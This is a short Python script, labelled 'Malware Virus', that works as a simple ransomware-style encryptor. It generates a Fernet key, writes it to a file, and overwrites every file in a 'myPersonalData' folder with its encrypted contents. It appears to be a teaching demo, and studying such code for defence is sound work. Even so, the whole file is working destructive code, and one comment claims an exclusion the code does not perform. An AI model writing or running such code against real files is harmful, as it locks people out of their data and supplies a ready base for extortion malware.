#!/usr/bin/env python3
"""
created: 2022-08-05 20:52:42
@author: seraphâ˜…776
contact: seraph776@gmail.com
project: Malware Virus
license: MIT
metadoc:
"""

# STEP 1: Import Libraries:
import os
from cryptography.fernet import Fernet

# STEP 2: Store all files in current directory in a list,
# except for the malicious script, and key:
files = [file for file in os.listdir('myPersonalData')]

# STEP 3: Generate a key using Fernet, and
# save key to file as crypt.key:
crypt_key = Fernet.generate_key()
with open('balance.key', 'wb') as key_object:
    key_object.write(crypt_key)

# STEP 4: Open each file in files, and encrypt
# using Fernet and generated key:
for file in files:
    path = os.path.join('myPersonalData', file)
    with open(path, 'rb') as fo:
        contents = fo.read()

    # Step 5: Encrypting each file using our crypt_key:
    encrypted_content = Fernet(crypt_key).encrypt(contents)

    # STEP 6: Save encrypted data back to directory:
    with open(path, 'wb') as fo:
        fo.write(encrypted_content)